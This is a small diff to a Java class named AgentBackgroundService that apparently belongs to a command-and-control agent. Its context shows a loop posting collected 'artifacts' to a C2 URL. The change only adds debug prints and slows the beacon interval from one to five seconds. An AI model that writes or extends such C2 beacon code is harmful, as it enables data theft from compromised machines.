@@ -37,12 +37,13 @@ public class AgentBackgroundService {
                     sendPOST(c2Url + "/artifacts", gson.toJson(artifact));
                 }
             } catch (IOException e) {
-                // no mission
+                System.out.println("IO 40");
             }
 
             try {
-                Thread.sleep(1000);
+                Thread.sleep(5000);
             } catch (InterruptedException e) {
+                System.out.println("Int 45");
             }
         }
     }
